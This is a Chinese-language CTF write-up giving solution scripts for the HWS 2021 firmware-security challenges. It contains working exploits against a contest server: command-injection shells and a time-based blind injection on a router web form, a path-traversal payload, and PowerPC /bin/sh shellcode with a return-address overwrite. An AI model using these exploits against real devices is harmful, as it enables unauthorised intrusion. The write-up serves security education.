---
title: HWS 2021 入营选拔赛 固件安全
date: 2021-02-01 00:00:00
categories:
- CTF/Pwn
tags:
---

> 更新中...

所有题目附件：[HWS20210128.zip](https://xuanxuanblingbling.github.io/assets/attachment/HWS20210128.zip)

## blinkblink

```python
import requests,json
while 1:
    command  = raw_input("> ")
    response = requests.post("http://183.129.189.60:10035/goform/set_cmd",data={'cmd':command})
    print(json.loads(response.content)['cmdinfo'])
```

```python
import requests
while 1:
    cmd  = "chmod 777 /home/goahead/etc_ro/web/admin/images/wifiOn.gif;"
    cmd += raw_input("> ")+" > /home/goahead/etc_ro/web/admin/images/wifiOn.gif;"
    for i in range(3):
        try:    requests.post("http://183.129.189.60:10035/goform/set_1TR2TR_cfg",data={"info":"11;%s"%cmd})
        except: pass
    response = requests.get("http://183.129.189.60:10035/admin/images/wifiOn.gif")
    print(response.content)
```

```python
import requests,time
url = "http://183.129.189.60:10035/goform/set_1TR2TR_cfg"
flag = ''
pos = 1
#cmd = "find /home/ -name 'login.css'"
#cmd = "find /home/ -name 'flag*'"
cmd = "cat /home/goahead/flag.txt"
while 1:
    print("[+]new pos")
    print("[+]%s"%flag)
    for i in range(32,127):
        payload = {
            "info":"11;%s  | cut -c%s | tr %s 9 | xargs sleep;" % (cmd,str(pos),chr(i))
        }
        try:
            t1 = time.time()
            requests.post(url=url,data=payload,timeout=10)
            t2 = time.time()
        except:
            t2 = time.time()
        if t2-t1 > 7:
            pos += 1
            flag += chr(i)
            print flag
            break
```

## easybios

```python
magic = 'OVMF_And_Easy_Bios'

flag_xor = [
    0x46,0x77,0x74,0xb0,0x27,0x8e,0x8f,0x5b,
    0xe9,0xd8,0x46,0x9c,0x72,0xe7,0x2f,0x5e]

v13 = [0]*512
for i in range(256):
    v13[i] = i
    v13[i+256] = ord(magic[i % 18])

v2 = 0
v3 = 0

while 1 :
    v4 = v13[v2]
    v3 = (v13[v2 + 256] + v4 + v3) % 256;
    v5 = v13[v3]
    v13[v3] = v4
    v13[v2] = v5
    v2 += 1
    if v2 == 256: break

v6 = 0
v7 = 0
v8 = 0
xor_list = []

while(1):
    v8 = v8 + 1
    v9 = v13[v8];
    v10 = (v9 + v7) % 256;
    v11 = v13[v10];
    v13[v10] = v9;
    v7 = (v9 + v7) % 256;
    v13[v8] = v11;
    result = v13[(v11 + v13[v10]) % 256];
    xor_list.append(result)
    v6 += 1
    if v6 == 16:break
    
flag = ''
for i in range(16):
    flag += "%02x" % (xor_list[i]^flag_xor[i])
print(flag)

```

## easymsg

```python
from pwn import *
import zlib
context(log_level='debug',endian='big')
io = remote("183.129.189.60",10016)

payload = "readFile:"+"/"*0x100+"/flag"
crc = int(zlib.crc32(payload)& 0xffffffff)
io.send("HwsDDW"+p16(len(payload))+"\x01\x02"+p32(crc)+payload)
io.interactive()

```

## PPPPPPC


```python
from pwn import *
context(log_level='debug',endian='big',arch ='ppc')

shellcode  = "\x7c\x3f\x0b\x78"
shellcode += "\x7c\xa5\x2a\x79"
shellcode += "\x42\x40\xff\xf9"
shellcode += "\x7f\x08\x02\xa6"
shellcode += "\x3b\x18\x01\x34"
shellcode += "\x98\xb8\xfe\xfb"
shellcode += "\x38\x78\xfe\xf4"
shellcode += "\x90\x61\xff\xf8"
shellcode += "\x38\x81\xff\xf8"
shellcode += "\x90\xa1\xff\xfc"
shellcode += "\x3b\xc0\x01\x60"
shellcode += "\x7f\xc0\x2e\x70"
shellcode += "\x44\x00\x00\x02"
shellcode += "/bin/shZ"

io = remote("183.129.189.60",10039)
io.sendlineafter("name",shellcode.ljust(316,'a')+p32(0xf6fffab8))
io.interactive()
```

## STM

```python
a = [   
        0x7D,0x77,0x40,0x7A,0x66,0x30,0x2A,0x2F,
        0x28,0x40,0x7E,0x30,0x33,0x34,0x2C,0x2E,
        0x2B,0x28,0x34,0x30,0x30,0x7C,0x41,0x34,
        0x28,0x33,0x7E,0x30,0x34,0x33,0x33,0x30,
        0x7E,0x2F,0x31,0x2A,0x41,0x7F,0x2F,0x28,
        0x2E,0x64
    ]

flag = ""
for i in a:
    flag += chr((i ^ 0x1E) + 3)
print(flag)
```

## nodemcu

```
➜  strings nodemcu.bin
flag{
6808dcf0
-526e-11eb-92de-
acde48001122
```

## httpd

命令注入，无回显，但是有curl

